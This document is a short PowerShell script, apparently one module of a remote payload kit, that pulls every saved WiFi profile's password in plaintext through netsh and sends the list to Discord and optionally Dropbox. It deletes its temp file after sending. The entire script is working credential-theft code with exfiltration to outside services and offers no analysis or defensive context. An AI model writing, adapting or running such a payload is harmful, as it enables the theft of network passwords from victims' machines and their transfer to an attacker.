# ============================================================
# WiFi Password Grabber - Modular Remote Payload
# ============================================================
# Extracts all saved WiFi passwords and sends to Discord/Dropbox
# ============================================================

$sysid = Get-SystemID
$output = "🔐 **WiFi Passwords from $sysid**`n"
$output += "📅 " + (Get-Date -Format "yyyy-MM-dd HH:mm:ss") + "`n"
$output += "=" * 40 + "`n`n"

# Get all WiFi profiles
$profiles = (netsh wlan show profiles) | Select-String '\:(.+)$' | ForEach-Object {
    $name = $_.Matches.Groups[1].Value.Trim()
    if ($name) {
        $passInfo = (netsh wlan show profile name="$name" key=clear) | Select-String 'Key Content\W+\:(.+)$'
        $pass = if ($passInfo) { $passInfo.Matches.Groups[1].Value.Trim() } else { "(No password)" }
        
        $output += "📶 **$name**`n"
        $output += "   🔑 ``$pass```n`n"
    }
}

# Send results
if ($output.Length -gt 50) {
    if ($output.Length -gt 1900) {
        $tmp = "$env:TEMP\wifi_passwords.txt"
        $output | Out-File $tmp -Encoding UTF8
        Send-Discord "📶 **WiFi Passwords from $sysid** (Attached due to size)" $tmp
        Remove-Item $tmp -ErrorAction SilentlyContinue
    } else {
    Send-Discord $output
    }

    if ($env:DB) {
        $fileName = "wifi_$sysid`_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
        Send-Dropbox $output $fileName
    }
} else {
    Send-Discord "⚠️ No WiFi profiles found on $sysid"
}

